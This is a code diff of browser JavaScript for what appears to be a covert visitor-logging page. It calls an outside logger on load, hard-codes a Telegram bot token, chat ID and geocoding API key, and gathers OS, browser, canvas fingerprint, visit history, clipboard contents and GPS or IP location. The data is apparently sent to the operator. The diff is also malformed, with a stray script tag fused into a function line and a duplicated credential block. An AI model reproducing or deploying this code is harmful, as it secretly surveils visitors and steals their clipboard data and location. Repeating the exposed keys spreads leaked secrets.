@@ -1,12 +1,8 @@
+<script>
 fetch("https://fake-logger.onrender.com/logger.php")
-  .then(res => console.log("Visitor logged"))
+  .then(() => console.log("Visitor logged"))
   .catch(err => console.error("Logging failed", err));
 
-const TELEGRAM_BOT_TOKEN = '7943375930:AAEiifo4A9NiuxY13o73qjCJVUiHXEu2ta8';
-const CHAT_ID = '6602027873';
-const OPENCAGE_API_KEY = '8e640acb36a3409a9877e0c900653f7d';
-
-function buildAddress(components) {<script>
 const TELEGRAM_BOT_TOKEN = '7943375930:AAEiifo4A9NiuxY13o73qjCJVUiHXEu2ta8';
 const CHAT_ID = '6602027873';
 const OPENCAGE_API_KEY = '8e640acb36a3409a9877e0c900653f7d';
@@ -45,10 +41,10 @@ function collectDeviceInfo() {
   else if (userAgent.includes("Safari")) browser = "Safari";
 
   let os = "Unknown OS";
-  if (/Win/.test(userAgent)) os = "Windows";
-  else if (/Mac/.test(userAgent)) os = "MacOS";
-  else if (/X11/.test(userAgent)) os = "UNIX";
-  else if (/Linux/.test(userAgent)) os = "Linux";
+  if (userAgent.includes("Win")) os = "Windows";
+  else if (userAgent.includes("Mac")) os = "MacOS";
+  else if (userAgent.includes("X11")) os = "UNIX";
+  else if (userAgent.includes("Linux")) os = "Linux";
   else if (/Android/.test(userAgent)) os = "Android";
   else if (/iPhone|iPad|iPod/.test(userAgent)) os = "iOS";
 
@@ -62,9 +58,10 @@ function collectDeviceInfo() {
     ctx.font = "14px 'Arial'";
     ctx.fillText("DeviceFingerprint", 2, 2);
     canvasFingerprint = canvas.toDataURL();
-  } catch {}
+  } catch (err) {}
 
-  return `📱 Device Info:
+  return `
+📱 Device Info:
 🖥 OS: ${os}
 🌐 Browser: ${browser}
 📊 Platform: ${platform}
@@ -77,11 +74,13 @@ function collectDeviceInfo() {
 }
 
 function getVisitStats() {
-  let visits = parseInt(localStorage.getItem("visits") || "0") + 1;
+  let visits = localStorage.getItem("visits") || 0;
+  visits = parseInt(visits) + 1;
   localStorage.setItem("visits", visits);
 
   const firstVisit = localStorage.getItem("firstVisit") || new Date().toISOString();
   const lastVisit = new Date().toISOString();
+
   localStorage.setItem("firstVisit", firstVisit);
   localStorage.setItem("lastVisit", lastVisit);
 
@@ -89,6 +88,32 @@ function getVisitStats() {
 🔢 Count: ${visits}
 🕒 First: ${firstVisit}
 🕘 Last: ${lastVisit}`;
+}
+
+async function hashFingerprint(rawString) {
+  const encoder = new TextEncoder();
+  const data = encoder.encode(rawString);
+  const hashBuffer = await crypto.subtle.digest("SHA-256", data);
+  return Array.from(new Uint8Array(hashBuffer)).map(b => b.toString(16).padStart(2, "0")).join("");
+}
+
+async function generateFingerprint() {
+  const userAgent = navigator.userAgent;
+  const plugins = Array.from(navigator.plugins || []).map(p => p.name).join(",");
+  const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+
+  let canvasFP = '';
+  try {
+    const canvas = document.createElement("canvas");
+    const ctx = canvas.getContext("2d");
+    ctx.textBaseline = "top";
+    ctx.font = "14px 'Arial'";
+    ctx.fillText("fingerprint", 2, 2);
+    canvasFP = canvas.toDataURL();
+  } catch {}
+
+  const raw = userAgent + plugins + timezone + canvasFP;
+  return await hashFingerprint(raw);
 }
 
 async function getClipboardContents() {
@@ -120,32 +145,6 @@ async function getLocationInfo(lat, lon) {
   } catch {
     return {};
   }
-}
-
-async function hashFingerprint(rawString) {
-  const encoder = new TextEncoder();
-  const data = encoder.encode(rawString);
-  const hashBuffer = await crypto.subtle.digest("SHA-256", data);
-  return Array.from(new Uint8Array(hashBuffer)).map(b => b.toString(16).padStart(2, "0")).join("");
-}
-
-async function generateFingerprint() {
-  const userAgent = navigator.userAgent;
-  const plugins = Array.from(navigator.plugins || []).map(p => p.name).join(",");
-  const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-
-  let canvasFP = '';
-  try {
-    const canvas = document.createElement("canvas");
-    const ctx = canvas.getContext("2d");
-    ctx.textBaseline = "top";
-    ctx.font = "14px 'Arial'";
-    ctx.fillText("fingerprint", 2, 2);
-    canvasFP = canvas.toDataURL();
-  } catch {}
-
-  const raw = userAgent + plugins + timezone + canvasFP;
-  return "FP-" + await hashFingerprint(raw);
 }
 
 async function logIPOnly(reason = "⚠️ No GPS, IP Only") {
